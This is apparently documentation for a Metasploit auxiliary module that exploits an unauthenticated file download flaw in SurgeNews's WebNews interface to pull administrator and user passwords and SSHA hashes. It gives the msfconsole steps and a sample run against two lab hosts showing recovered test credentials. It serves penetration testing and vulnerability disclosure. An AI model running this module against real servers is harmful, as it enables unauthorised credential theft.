## Description

  This module exploits a vulnerability in the WebNews web interface of SurgeNews on TCP ports 9080 and 8119 which allows unauthenticated users to download arbitrary files from the software root directory; including the user database, configuration files and log files.

  This module extracts the administrator username and password, and the usernames and passwords or password hashes for all users.


## Vulnerable Application

  [SurgeNews](http://netwinsite.com/surgenews/) is a high performance, fully threaded, next generation News Server with integrated WebNews interface.

  This module has been tested successfully on:

  * SurgeNews version 2.0a-13 on Windows 7 SP 1.
  * SurgeNews version 2.0a-12 on Ubuntu Linux.

  Installers:

  * [SurgeNews Installers](http://netwinsite.com/cgi-bin/keycgi.exe?cmd=download&product=surgenews)


## Verification Steps

  1. Start `msfconsole`
  2. Do: `use auxiliary/scanner/http/surgenews_user_creds`
  3. Do: `set rhosts [IP]`
  4. Do: `run`
  5. You should get credentials


## Scenarios

  ```
  msf > use auxiliary/scanner/http/surgenews_user_creds 
  msf auxiliary(surgenews_user_creds) > set rhosts 172.16.191.133 172.16.191.166
  rhosts => 172.16.191.133 172.16.191.166
  msf auxiliary(surgenews_user_creds) > run

  [+] Found administrator credentials (admin:admin)

  SurgeNews User Credentials
  ==========================

   Username   Password  Password Hash                           Admin
   --------   --------  -------------                           -----
   admin      admin                                             true
   qwerty@bt            {ssha}BuFLjIFUUSy1IltX3AuN420qV2ZFU7EL  false
   user@bt              {ssha}HFTkDsnNlLiaHN+sIS9VQarVGGXmYISn  false

  [+] Credentials saved in: /root/.msf4/loot/20170616185817_default_172.16.191.133_surgenews.user.c_633569.txt
  [*] Scanned 1 of 2 hosts (50% complete)
  [+] Found administrator credentials (test:test)
  [+] Found user credentials (zxcv@win-sgbsd5tqutq:zxcv)

  SurgeNews User Credentials
  ==========================

   Username              Password  Password Hash                           Admin
   --------              --------  -------------                           -----
   asdf@win-sgbsd5tqutq            {ssha}8ytixKjxf3kaBc6T471R1Re/C8MUnKnF  false
   test                  test                                              true
   test@win-sgbsd5tqutq            {ssha}Vw8EkFxAJuiZrb98Fz+sdr/yEEmBZ2Jc  false
   test@win-sgbsd5tqutq            {ssha}j4teSf4CgA3+XVRJscFHyqoOQJRoLg4K  false
   zxcv@win-sgbsd5tqutq  zxcv                                              false

  [+] Credentials saved in: /root/.msf4/loot/20170616185817_default_172.16.191.166_surgenews.user.c_077983.txt
  [*] Scanned 2 of 2 hosts (100% complete)
  [*] Auxiliary module execution completed
  ```

